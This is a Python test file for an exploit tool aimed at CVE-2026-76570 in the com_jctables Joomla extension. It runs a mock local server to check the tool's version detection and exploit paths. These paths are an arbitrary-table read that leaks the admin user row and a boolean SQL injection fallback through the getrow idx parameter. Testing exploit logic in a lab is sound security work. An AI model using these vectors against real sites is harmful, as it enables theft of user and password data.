#!/usr/bin/env python3
"""Lab regression tests for CVE-2026-76570 exploit logic (no network)."""
from __future__ import annotations

import http.server
import json
import socketserver
import sys
import threading
import time

import _engine as eng


def start_lab(port: int, version: str = "1.10.31.2", getdatarow_users: bool = True):
    from urllib.parse import parse_qs, urlparse as up

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *_a):
            return

        def do_GET(self):
            p = up(self.path)
            q = parse_qs(p.query, keep_blank_values=True)
            if p.path.endswith("/administrator/components/com_jctables/jctables.xml"):
                body = (
                    b'<?xml version="1.0"?><extension><version>'
                    + version.encode()
                    + b"</version></extension>"
                )
                self._send(200, "application/xml", body)
                return
            if q.get("option", [""])[0] == "com_jctables" and q.get("format", [""])[0] == "json":
                task = (q.get("task") or [""])[0]
                if task == "getdatarow" and getdatarow_users:
                    tn = (q.get("tn") or [""])[0]
                    if tn.endswith("users"):
                        self._send_json(
                            {
                                "data": {
                                    "id": "1",
                                    "username": "admin",
                                    "email": "admin@lab.local",
                                    "password": "$2y$10$labhashfortestPOCBIT76570OKxxxx",
                                }
                            }
                        )
                        return
                if task == "getrow":
                    idx = (q.get("idx") or [""])[0]
                    if "1=1" in idx.replace(" ", ""):
                        self._send_json({"data": [[{"id": "1"}]]})
                        return
                    if "1=2" in idx.replace(" ", ""):
                        self._send_json({"data": [[]]})
                        return
                self._send_json({"data": None, "message": "lab"})
                return
            self.send_response(404)
            self.end_headers()

        def _send(self, code, ctype, body):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _send_json(self, obj):
            self._send(200, "application/json", json.dumps(obj).encode())

    httpd = socketserver.TCPServer(("127.0.0.1", port), Handler)
    httpd.allow_reuse_address = True
    th = threading.Thread(target=httpd.serve_forever, daemon=True)
    th.start()
    time.sleep(0.15)
    return httpd


def ok(name: str) -> None:
    print(f"  [PASS] {name}")


def fail(name: str, detail: str) -> None:
    print(f"  [FAIL] {name} - {detail!s}")
    sys.exit(1)


def main() -> None:
    print("\nCVE-2026-76570 lab exploit logic tests\n")
    port = 8788
    base = f"http://127.0.0.1:{port}"

    # 1) check + exploit with explicit prefix (same as poc.py --lab)
    httpd = start_lab(port, "1.10.31.2")
    try:
        chk = eng.check_target(base, 8, None)
        if not chk.get("exploitable_candidate"):
            fail("check affected", chk.get("status"))
        if chk.get("version") != "1.10.31.2":
            fail("check version", str(chk.get("version")))
        ok("check -> exploitable_candidate + manifest 1.10.31.2")

        ex = eng.exploit_target(base, 8, None, force=True, prefix_hint="lab_")
        if not ex.get("exploited"):
            fail("exploit prefix lab_", ex.get("status"))
        if ex.get("hit", {}).get("vector") != "getdatarow_arbitrary_table":
            fail("exploit vector", str(ex.get("hit")))
        if ex.get("hit", {}).get("username") != "admin":
            fail("exploit username", str(ex.get("hit")))
        ok("exploit getdatarow + lab_ prefix -> admin row")

        # Auto prefix: lab accepts any *users table name
        ex2 = eng.exploit_target(base, 8, None, force=True, prefix_hint=None)
        if not ex2.get("exploited"):
            fail("exploit auto prefix", ex2.get("status"))
        ok("exploit auto prefix list -> first jos_users hit")

        s = eng.mk_session(8, None)
        ok1, proof, _ = eng.try_boolean_getrow(s, base, 1, 0)
        if not ok1 or proof.get("vector") != "getrow_boolean_sqli":
            fail("getrow boolean", str(proof))
        ok("getrow boolean 1=1 vs 1=2 differential")
    finally:
        httpd.shutdown()

    # 2) getrow-only lab (no getdatarow user leak)
    port2 = 8789
    base2 = f"http://127.0.0.1:{port2}"
    httpd2 = start_lab(port2, "1.10.31.2", getdatarow_users=False)
    try:
        ex3 = eng.exploit_target(base2, 8, None, force=True, prefix_hint=None)
        if not ex3.get("exploited"):
            fail("fallback getrow only", ex3.get("status"))
        if ex3.get("hit", {}).get("vector") != "getrow_boolean_sqli":
            fail("fallback vector", str(ex3.get("hit")))
        ok("prefix miss -> getrow_boolean_sqli fallback")
    finally:
        httpd2.shutdown()

    # 3) patched version
    port3 = 8790
    base3 = f"http://127.0.0.1:{port3}"
    httpd3 = start_lab(port3, "1.21.1")
    try:
        ex4 = eng.exploit_target(base3, 8, None, force=False, prefix_hint="lab_")
        if ex4.get("exploited"):
            fail("patched should not exploit", "exploited=true")
        if ex4.get("status") != "patched_gte_1_21_1":
            fail("patched status", ex4.get("status"))
        ok("manifest 1.21.1 -> patched, no exploit")

        chk3 = eng.check_target(base3, 8, None)
        if chk3.get("exploitable_candidate"):
            fail("patched check", "candidate true")
        ok("check on 1.21.1 -> not candidate")
    finally:
        httpd3.shutdown()

    print("\n  All lab exploit logic tests passed.\n")


if __name__ == "__main__":
    main()
